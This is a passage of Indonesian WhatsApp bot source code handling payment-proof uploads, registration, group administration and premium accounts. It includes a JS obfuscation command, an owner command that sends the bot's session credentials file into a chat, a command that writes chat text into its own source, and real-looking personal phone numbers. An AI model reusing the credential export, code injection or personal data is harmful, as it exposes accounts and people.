    console.log("Case 'upload_dana_proof' dijalankan."); // Debugging

    // Pesan instruksi pengunggahan
    const confirmationText = `
📝 *Instruksi Pengunggahan Bukti Transfer:*
1. Pastikan bukti transfer terlihat jelas.
2. Screnshoot yang diterima: JPG, PNG, atau PDF.
3. Kirim bukti transfer Anda dengan Screnshoot.

📌 *E-Wallet DANA:* 
- ATAS NAMA: GALANG
- Nomor dana: 082280993065
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Next",
                sections: [
                    {
                        title: "Lanjutkan Transaksi",
                        rows: [
                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
                        ]
                    }
                ]
            })
        }
    ];


try {
    // Path ke file gambar lokal
    const imagePath = './src/media/danaa.png'; // Ganti dengan path yang sesuai

    // Membaca gambar dari file lokal
    const imageBuffer = fs.readFileSync(imagePath);

    // Menyiapkan media (gambar)
    const mediaMessage = await prepareWAMessageMedia(
        { image: imageBuffer }, // Menggunakan buffer gambar lokal
        { upload: sych.waUploadToServer }
    );

    // Membuat pesan dengan gambar
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: confirmationText
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
                            title: 'Pengunggahan Bukti Transfer Dana',
                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
                            hasMediaAttachment: true, // Menandakan bahwa ada media
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: button
                        })
                    })
                }
            }
        },
        { quoted: fkontak }
    );

   

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses upload_dana_proof:", error); // Debugging
    }
}
break;

case 'submit_dana_proof': {
    console.log("Case 'submit_dana_proof' dijalankan."); // Debugging

    // Pesan konfirmasi pengunggahan bukti
    const proofSubmissionText = `

⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Kirim Bukti",
                sections: [
                    {
                        title: "Proses Unggah",
                        rows: [
                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: proofSubmissionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Silakan unggah bukti Anda."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Unggah Bukti Transfer',
                                subtitle: 'Pengunggahan bukti transfer Anda.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses submit_dana_proof:", error); // Debugging
    }
}
break;


case 'encrypt': {
    console.log("[INFO] Case 'encrypt' dimulai...");

   
    // Periksa apakah ada pesan yang di-reply
    if (!m.quoted) {
        console.log("[ERROR] Tidak ada pesan yang di-reply.");
        return await sych.sendMessage(m.chat, { text: "Reply file .js untuk diencrypt." }, { quoted: m });
    }

    // Coba akses informasi file melalui m.quoted.documentMessage
    const mime = m.quoted.mimetype || m.quoted.msg?.documentMessage?.mimetype || '';
    const originalFilename = m.quoted.fileName || m.quoted.msg?.documentMessage?.fileName || 'unknown.js';

    console.log("[DEBUG] MIME type file:", mime);
    console.log("[DEBUG] Nama file:", originalFilename);

    // Periksa apakah file berformat .js
    if (!mime.includes("javascript") && !originalFilename.endsWith(".js")) {
        console.log("[ERROR] File yang di-reply bukan file .js");
        return await sych.sendMessage(m.chat, { text: "File harus bertipe .js" }, { quoted: m });
    }

    try {
        console.log("[INFO] Mengunduh file...");
        const media = await m.quoted.download();

        if (!media) {
            console.log("[ERROR] Gagal mengunduh file.");
            return await sych.sendMessage(m.chat, { text: "Gagal mengunduh file. Coba lagi." }, { quoted: m });
        }

        // Tentukan nama file
        const inputPath = `./temp/${originalFilename}`;
        const outputPath = `./temp/encrypted_${originalFilename}`;
        console.log("[DEBUG] File disimpan sementara di:", inputPath);

        if (!fs.existsSync('./temp')) fs.mkdirSync('./temp');
        await fs.writeFileSync(inputPath, media);

        await sych.sendMessage(m.chat, { text: "Memproses encrypt file .js..." }, { quoted: m });

        console.log("[INFO] Memulai proses obfuscation...");
        const sourceCode = await fs.readFileSync(inputPath, 'utf8');

        // Lakukan obfuscation
        const obfuscatedCode = JavaScriptObfuscator.obfuscate(sourceCode, {
            compact: true,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            deadCodeInjection: true,
            deadCodeInjectionThreshold: 0.4,
            disableConsoleOutput: true,
            renameGlobals: true,
            stringArray: true,
            simplify: true,
            identifierNamesGenerator: 'mangled',
            rotateStringArray: true,
            numbersToExpressions: true,
            stringArrayThreshold: 0.75,
        }).getObfuscatedCode();

        // Array khusus untuk mengganti string setelah obfuscation
        const replacements = [
            { original: 'Sychz', replacement: 'memek' },
            { original: 'https://my.hitori.pw/api', replacement: 'kontol' },
            { original: '6288274119688', replacement: 'sinting' },
            { original: '50251731838', replacement: 'sinting' },
              { original: '17089003182', replacement: 'sinting' },          { original: 'https://my.hitori.pw/apihtrkey-awokawok', replacement: 'sinting' }         
        ];

        // Fungsi untuk mengganti string dalam kode setelah obfuscation
        function replaceWithArray(obfuscatedCode) {
            replacements.forEach(replacement => {
                const regex = new RegExp(replacement.original, 'g');
                obfuscatedCode = obfuscatedCode.replace(regex, replacement.replacement);
            });
            return obfuscatedCode;
        }

        // Ganti string dalam kode yang sudah diobfuscate
        const finalCode = replaceWithArray(obfuscatedCode);

        console.log("[INFO] Menyimpan hasil encrypt...");
        await fs.writeFileSync(outputPath, finalCode);

        console.log("[INFO] Mengirim file hasil encrypt...");
        await sych.sendMessage(
            m.chat,
            {
                document: fs.readFileSync(outputPath),
                mimetype: "application/javascript",
                fileName: `encrypted_${originalFilename}`,
                caption: "Berhasil mengenkripsi file .js!"
            },
            { quoted: m }
        );

        console.log("[INFO] Menghapus file sementara...");
        fs.unlinkSync(inputPath);
        fs.unlinkSync(outputPath);

        console.log("[INFO] Case 'encrypt' selesai.");
    } catch (error) {
        console.error("[ERROR] Terjadi kesalahan:", error);
        await sych.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengenkripsi: " + error.message }, { quoted: m });
    }
}
break;

//daftar

case 'daftar': {
    if (isRegistered) {
  
        const name = getUserName(m.sender);
        return sycreply(`❌ Kamu sudah terdaftar sebelumnya dengan nama: *${name}*`);
    }
const loadingTexts = ["█▒▒▒▒▒▒▒▒▒▒▒ 10%", "████▒▒▒▒▒▒▒▒ 30%", "███████▒▒▒▒▒ 50%", "██████████▒▒ 80%", "████████████ 100%", "> menyala wiii"];
let sentMessage;

try {
    // Kirim pesan awal
    sentMessage = await sych.sendMessage(m.chat, { text: loadingTexts[0] },
    { 
						quoted: fkontak 
					});
    

    // Edit pesan dengan mengganti teks
    for (let i = 1; i < loadingTexts.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
        await sych.sendMessage(m.chat, {
            edit: sentMessage.key, // Kunci pesan yang ingin diedit
            text: loadingTexts[i] // Teks baru
        });
    }
} catch (error) {
    console.error("Error saat mengedit pesan:", error);
}
    // Ambil nama pengguna WhatsApp yang terdaftar
    const userName = m.pushName || "Pengguna"; // Jika pushName kosong, gunakan "Pengguna"

    // Jika tidak ada nama yang dimasukkan (gunakan nama dari WhatsApp)
    if (!text) {
        // Pesan instruksi
        let instructionText = `❓ *Daftar sekarang*\n\nSilakan Pilih tombol di bawah ini untuk mendaftar sekarang\nNikmati akses kesemua Fitur bot yg tersedia\n\n`;

        // Siapkan konten pesan interaktif
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: instructionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                ...(await prepareWAMessageMedia(
                                    { video: videoMenu },
                                    { upload: sych.waUploadToServer }
                                )),
                                title: 'Registrasi',
                                subtitle: '',
                                hasMediaAttachment: true
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
    {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "Pilih Opsi ⎙",
            sections: [
                {
                    title: "Opsi Pendaftaran",
                    highlight_label: "Daftar Now!!",
                    rows: [
                        {
                            title: "Daftar",
                            id: `${prefix}daftar ${userName}`, // Menggunakan nama WhatsApp
                            description: `Hai ${userName} Pilih Untuk Daftar Sekarang`
                        },
                        {
                            title: "Cara Daftar",
                            id: `${prefix}guide`,
                            description: "Panduan singkat."
                        },
                        {
                            title: "Info Lainnya",
                            id: `${prefix}ppk`,
                            description: "Lihat informasi tambahan."
                        }
                    ]
                },
                {
                    title: "Other",
                    highlight_label: "Script",
                    rows: [
                        {
                            title: "Link Script",
                            id: `${prefix}scc`,
                            description: "Download Link Script Bot"
                        },
                        {
                            title: "Payment",
                            id: `${prefix}donasi`,
                            description: "Menyala wii Donasi dikit wii."
                        }
                    ]
                }
            ]
        })
    }
]
}),
                            contextInfo: {
                                mentionedJid: [m.sender, '0@s.whatsapp.net'],
                                forwardingScore: 9999,
                                isForwarded: true
                            }
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        // Kirim pesan interaktif
        await sych.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
        return;
    }

    // Jika pengguna memasukkan nama (input dari pengguna), gunakan nama yang dimasukkan
    const user = { name: text.trim(), id: m.sender };
    daftar.push(user);
    fs.writeFileSync('./database/daftar.json', JSON.stringify(daftar));
    
    

    // Kirim balasan sukses
    sycreply(`✅ Terima kasih telah mendaftar!\n\n*Nama:* ${user.name}\nSekarang kamu dapat mengakses semua fitur.`);
}
break;



case 'setppbot': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!/image/.test(mime)) return sycreply(`Reply Image Dengan Caption ${prefix + command}`);
    let media = await sych.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
    if (text.length > 0) {
        let { img } = await generateProfilePicture(media);
        await sych.query({
            tag: 'iq',
            attrs: {
                to: botNumber,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [{
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
            }]
        });
        await fs.unlinkSync(media);
        sycreply('Sukses');
    } else {
        await sych.updateProfilePicture(botNumber, { url: media });
        await fs.unlinkSync(media);
        sycreply('Sukses');
    }
}
break;
			case 'delppbot': {
    if (!isCreator) return sycreply(mess.owner);
     
    await sych.removeProfilePicture(sych.user.id);
    sycreply('Sukses');
}
break;

case 'join': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!text) return sycreply('Masukkan Link Group!');
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return sycreply('Link Invalid!');
    const result = args[0].split('https://chat.whatsapp.com/')[1];
    sycreply(mess.wait);

    const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];
    for (const emoji of reactEmojis) {
        await sych.sendMessage(m.chat, {
            react: {
                text: emoji,
                key: m.key
            }
        });
    }
    await sych.groupAcceptInvite(result).catch((res) => {
        if (res.data == 400) return sycreply('Grup Tidak Di Temukan❗');
        if (res.data == 401) return sycreply('Bot Di Kick Dari Grup Tersebut❗');
        if (res.data == 409) return sycreply('Bot Sudah Join Di Grup Tersebut❗');
        if (res.data == 410) return sycreply('Url Grup Telah Di Setel Ulang❗');
        if (res.data == 500) return sycreply('Grup Penuh❗');
    });
}
break;

case 'leave': {
    if (!isCreator) return sycreply(mess.owner);
     
    await sych.groupLeave(m.chat).then(() => sych.sendFromOwner(owner, 'Sukses Keluar Dari Grup', m, {
        contextInfo: {
            isForwarded: true
        }
    }));
}
break;

case 'block':
case 'blokir': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
        const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat;
        await sych.updateBlockStatus(numbersOnly, 'block').then(() => sycreply(mess.done)).catch(() => sycreply('Gagal!'));
    }
}
break;

case 'listblock': {
     
    let anu = await sych.fetchBlocklist();
    sycreply(`Total Block : ${anu.length}\n` + anu.map(v => '• ' + v.replace(/@.+/, '')).join`\n`);
}
break;

case 'unblock':
case 'openblock':
case 'openblokir':
case 'unblokir': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
        const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat;
        await sych.updateBlockStatus(numbersOnly, 'unblock').then(() => sycreply(mess.done)).catch(() => sycreply('Gagal!'));
    }
}
break;

case 'adduang': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!args[0] || !args[1] || isNaN(args[1])) return sycreply(`Kirim/tag Nomernya!\n*< / >* Example:\n${prefix + command} 62xxx 1000`);
    const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const onWa = await sych.onWhatsApp(nmrnya);
    if (!onWa.length > 0) return sycreply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!');
    if (db.users[nmrnya] && db.users[nmrnya].uang) {
        addUang(args[1], nmrnya, db);
        sycreply('Sukses Add Uang');
    } else {
        sycreply('User tidak terdaftar di database!');
    }
}
break;
			case 'addlimit': {
    if (!isCreator) return sycreply(mess.owner)
    if (!args[0] || !args[1] || isNaN(args[1])) return sycreply(`Kirim/tag Nomernya!\n*< / >* Example:\n${prefix + command} 62xxx 10`)
    
    const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const onWa = await sych.onWhatsApp(nmrnya)
    if (!onWa.length > 0) return sycreply('Nomor Tersebut Tidak Terdaftar Di Whatsapp!')

    // Cek apakah user terdaftar di database
    if (!db.users[nmrnya] || !db.users[nmrnya].isRegistered) {
        return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".')
    }

    // Jika terdaftar dan memiliki limit, tambahkan limit
    if (db.users[nmrnya].limit) {
        addLimit(args[1], nmrnya, db)
        sycreply('Sukses Add limit')
    } else {
        sycreply('User tidak memiliki limit yang dapat diubah!')
    }
}
break
			case 'listpc': {
     
    if (!isCreator) return sycreply(mess.owner);

    let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id);
    let teks = `● *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`;
    if (anu.length === 0) return sycreply(teks);

    for (let i of anu) {
        if (store.messages[i] && store.messages[i].array && store.messages[i].array[0]) {
            let nama = store.messages[i].array[0].pushName;
            teks += `${setv} *Nama :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`;
        }
    }
    await sych.sendTextMentions(m.chat, teks, m);
}
break;
		case 'listgc': {
     
    if (!isCreator) return sycreply(mess.owner);

    let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id);
    let teks = `● *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`;
    if (anu.length === 0) return sycreply(teks);

    for (let i of anu) {
        let metadata = store.groupMetadata[i] || await sych.groupMetadata(i);
        teks += `${setv} *Nama :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n`;
    }
    await sych.sendTextMentions(m.chat, teks, m);
}
break;
		case 'setmenu': {
     
    if (!isCreator) return sycreply(mess.owner);

    if (!text) return sycreply(`There are 8 menu(s1,s2,s3,s4,s5,s6,s7,s8,s9)\nPlease select one\nExample ${prefix + command} s1`);
    if (text.startsWith('s')) {
        typemenu = text;
        sycreply(mess.done);
    } else {
        sycreply(`There are 8 menu(s1,s2,s3,s4,s5,s6,s7,s8,s9)\nPlease select one\nExample ${prefix + command} s1`);
    }
}
break;

case 'creategc':
case 'buatgc': {
     
    if (!isCreator) return sycreply(mess.owner);
    if (!text) return sycreply(`*< / >* Example:\n${prefix + command} *Nama Gc*`);

    let group = await sych.groupCreate(q, [m.sender]);
    let res = await sych.groupInviteCode(group.id);

    await sych.sendMessage(m.chat, {
        text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Nama Group :* *${q}*`,
        detectLink: true
    }, {
        quoted: m
    });

    await sych.groupParticipantsUpdate(group.id, [m.sender], 'promote');
    await sych.sendMessage(group.id, {
        text: 'Done'
    });
}
break;
			case 'addpr':
case 'addprem':
case 'addpremium': {
     
    if (!isCreator) return sycreply(mess.owner);

    if (!text) return sycreply(`*< / >* Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30 hari`);

    let [teks1, teks2] = text.split`|`;
    const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const onWa = await sych.onWhatsApp(nmrnya);
    if (!onWa.length > 0) return sycreply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!');

    if (teks2) {
        if (db.users[nmrnya] && db.users[nmrnya].limit) {
            prem.addPremiumUser(nmrnya, teks2.replace(/[^0-9]/g, '') + 'd', premium);
            sycreply(`Sukses ${command} @${nmrnya.split('@')[0]} Selama ${teks2}`);
            db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.premium;
            db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.premium;
        } else sycreply('Nomer tidak terdaftar di BOT !');
    } else {
        sycreply(`Masukkan waktunya!\*< / >* Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30d\n_d = day_`);
    }
}
break;

case 'delpr':
case 'delprem':
case 'delpremium': {
     
    if (!isCreator) return sycreply(mess.owner);

    if (!text) return sycreply(`*< / >* Example:\n${prefix + command} @tag`);

    const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (db.users[nmrnya] && db.users[nmrnya].limit) {
        if (prem.checkPremiumUser(nmrnya, premium)) {
            premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
            sycreply(`Sukses ${command} @${nmrnya.split('@')[0]}`);
            db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.free;
            db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.free;
        } else {
            sycreply(`User @${nmrnya.split('@')[0]} Bukan Premium❗`);
        }
    } else sycreply('Nomer tidak terdaftar di BOT !');
}
break;
			case 'listpr':
case 'listprem':
case 'listpremium': {
     
    if (!isCreator) return sycreply(mess.owner);
    
    let txt = `*------「 LIST PREMIUM 」------*\n\n`;
    for (let userprem of premium) {
        txt += `➸ *Nomer*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${db.users[userprem.id].limit}\n➸ *Uang*: ${db.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`;
    }
    sycreply(txt);
}
break;

case 'upsw': {
     
    if (!isCreator) return sycreply(mess.owner);

    const statusJidList = Object.keys(db.users);
    const backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    
    if (quoted.isMedia) {
        if (/image|video/.test(quoted.mime)) {
            await sych.sendMessage('status@broadcast', {
                [`${quoted.mime.split('/')[0]}`]: await quoted.download(),
                caption: text || m.quoted?.body || ''
            }, {
                statusJidList
            });
            sych.sendMessage(m.chat, {
                react: {
                    text: '✅',
                    key: m.key
                }
            });
        } else if (/audio/.test(quoted.mime)) {
            await sych.sendMessage('status@broadcast', {
                audio: await quoted.download(),
                mimetype: 'audio/mp4',
                ptt: true
            }, {
                backgroundColor,
                statusJidList
            });
            sych.sendMessage(m.chat, {
                react: {
                    text: '✅',
                    key: m.key
                }
            });
        } else sycreply('Only Support video/audio/image/text');
    } else if (quoted.text) {
        await sych.sendMessage('status@broadcast', {
            text: text || m.quoted?.body || ''
        }, {
            textArgb: 0xffffffff,
            font: Math.floor(Math.random() * 9),
            backgroundColor,
            statusJidList
        });
        sych.sendMessage(m.chat, {
            react: {
                text: '✅',
                key: m.key
            }
        });
    } else sycreply('Only Support video/audio/image/text');
}
break;

case 'addcase': {
     
    if (!isCreator) return sycreply(mess.owner);
    if (!text && !text.startsWith('case')) return sycreply('Masukkan Casenya!');
    
    fs.readFile('naze.js', 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const posisi = data.indexOf("case '19rujxl1e':");
        if (posisi !== -1) {
            const codeBaru = data.slice(0, posisi) + '\n' + `${text}` + '\n' + data.slice(posisi);
            fs.writeFile('naze.js', codeBaru, 'utf8', (err) => {
                if (err) {
                    sycreply('Terjadi kesalahan saat menulis file: ', err);
                } else {
                    sycreply('Case berhasil ditambahkan');
                }
            });
        } else {
            sycreply('Gagal Menambahkan case!');
        }
    });
}
break;
			case 'getcase': {
     
    if (!isCreator) return sycreply(mess.owner);
    if (!text) return sycreply('Masukkan Nama Casenya!');
    try {
        const getCase = (cases) => {
            return "case" + `'${cases}'` + fs.readFileSync("naze.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
        }
        sycreply(`${getCase(text)}`)
    } catch (e) {
        sycreply(`case ${text} tidak ditemukan!`)
    }
}
break;

case 'delcase': {
     
    if (!isCreator) return sycreply(mess.owner);
    if (!text) return sycreply('Masukkan Nama Casenya!');
    fs.readFile('naze.js', 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const regex = new RegExp(`case\\s+'${text.toLowerCase()}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');
        fs.writeFile('naze.js', modifiedData, 'utf8', (err) => {
            if (err) {
                sycreply('Terjadi kesalahan saat menulis file: ', err);
            } else {
                sycreply('Case berhasil dihapus dari file');
            }
        });
    });
}
break;
			case 'getsession': {
     
    if (!isCreator) return sycreply(mess.owner);
    await sych.sendMessage(m.chat, {
        document: fs.readFileSync('./nazedev/creds.json'),
        mimetype: 'application/json',
        fileName: 'creds.json'
    }, {
        quoted: m
    });
}
break;

case 'deletesession':
case 'delsession': {
     
    if (!isCreator) return sycreply(mess.owner);
    fs.readdir('./nazedev', async function(err, files) {
        if (err) {
            console.error('Unable to scan directory: ' + err);
            return sycreply('Unable to scan directory: ' + err);
        }
        let filteredArray = await files.filter(item => ['session-', 'pre-key', 'sender-key', 'app-state'].some(ext => item.startsWith(ext)));
        let teks = `Terdeteksi ${filteredArray.length} Session file\n\n`;
        if (filteredArray.length == 0) return sycreply(teks);
        filteredArray.map(function(e, i) {
            teks += (i + 1) + `. ${e}\n`;
        });
        if (text && text == 'true') {
            let { key } = await sycreply('Menghapus Session File..');
            await filteredArray.forEach(function(file) {
                fs.unlinkSync('./nazedev/' + file);
            });
            sleep(2000);
            sycreply('Berhasil Menghapus Semua Sampah Session', {
                edit: key
            });
        } else {
            sycreply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`);
        }
    });
}
break;
			case 'deletesampah':
case 'delsampah': {
     
    if (!isCreator) return sycreply(mess.owner);
    fs.readdir('./database/sampah', async function(err, files) {
        if (err) {
            console.error('Unable to scan directory: ' + err);
            return sycreply('Unable to scan directory: ' + err);
        }
        let filteredArray = await files.filter(item => ['gif', 'png', 'bin', 'mp3', 'mp4', 'jpg', 'webp', 'webm', 'opus', 'jpeg'].some(ext => item.endsWith(ext)));
        let teks = `Terdeteksi ${filteredArray.length} Sampah file\n\n`;
        if (filteredArray.length == 0) return sycreply(teks);
        filteredArray.map(function(e, i) {
            teks += (i + 1) + `. ${e}\n`;
        });
        if (text && text == 'true') {
            let { key } = await sycreply('Menghapus Sampah File..');
            await filteredArray.forEach(function(file) {
                fs.unlinkSync('./database/sampah/' + file);
            });
            sleep(2000);
            sycreply('Berhasil Menghapus Semua Sampah', {
                edit: key
            });
        } else {
            sycreply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`);
        }
    });
}
break;
			case 'scc':
case 'script':
case 'esce': {
     
    

    const iniesce = `https://github.com/sychyy/sychee\n⬆️ Itu Sc nya cuy`;

    sych.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: '5000000000',
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: iniesce,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true
                        }
                    }
                }
            }
        }
    }, {});

    await sych.sendMessage(m.chat, {
        react: {
            text: '🔗', // Emoji yang diinginkan
            key: m.key // Memberikan reaksi pada pesan perintah
        }
    });
}
break;
			// Tambahkan case baru di handler Anda
case 'd': {
    // Kirimkan pesan teks balasan ke pengguna
    sycreply('Donasi dapat dilakukan melalui link berikut:\n\n🌟 https://saweria.co/sych\n\nTerima kasih atas dukungannya!');
    
    break;
}
			// Group Menu
			case 'add': {
     
    if (!isCreator) return sycreply(mess.owner);
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);

    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
        const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
        try {
            await sych.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) => {
                for (let i of res) {
                    let invv = await sych.groupInviteCode(m.chat);
                    if (i.status == 408) return sycreply('Dia Baru-Baru Saja Keluar Dari Grub Ini!');
                    if (i.status == 401) return sycreply('Dia Memblokir Bot!');
                    if (i.status == 409) return sycreply('Dia Sudah Join!');
                    if (i.status == 500) return sycreply('Grub Penuh!');
                    if (i.status == 403) {
                        await sych.sendMessage(m.chat, {
                            text: `@${numbersOnly.split('@')[0]} Tidak Dapat Ditambahkan\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`,
                            mentions: [numbersOnly]
                        }, {
                            quoted: m
                        });
                        await sych.sendMessage(`${numbersOnly ? numbersOnly : '6282113821188@s.whatsapp.net'}`, {
                            text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`,
                            detectLink: true,
                            mentions: [numbersOnly, m.sender]
                        }, {
                            quoted: fkontak
                        }).catch((err) => sycreply('Gagal Mengirim Undangan!'));
                    } else if (i.status !== 200) {
                        sycreply('Gagal Add User');
                    }
                }
            });
        } catch (e) {
            sycreply('Terjadi Kesalahan! Gagal Add User');
        }
    }
}
break;
			case 'kick': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
        const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
        await sych.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => sycreply('Gagal Kick User!'));
    }
}
break;

case 'promote': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
        const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender;
        await sych.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => sycreply('Gagal!'));
    }
}
break;

case 'demote': {
     
    if (!m.isGroup) return sycreply(mess.group);
    if (!m.isAdmin) return sycreply(mess.admin);
    if (!m.isBotAdmin) return sycreply(mess.botAdmin);
    if (!text && !m.quoted) {
        sycreply(`*< / >* Example: ${prefix + command} 62xxx`);
    } else {
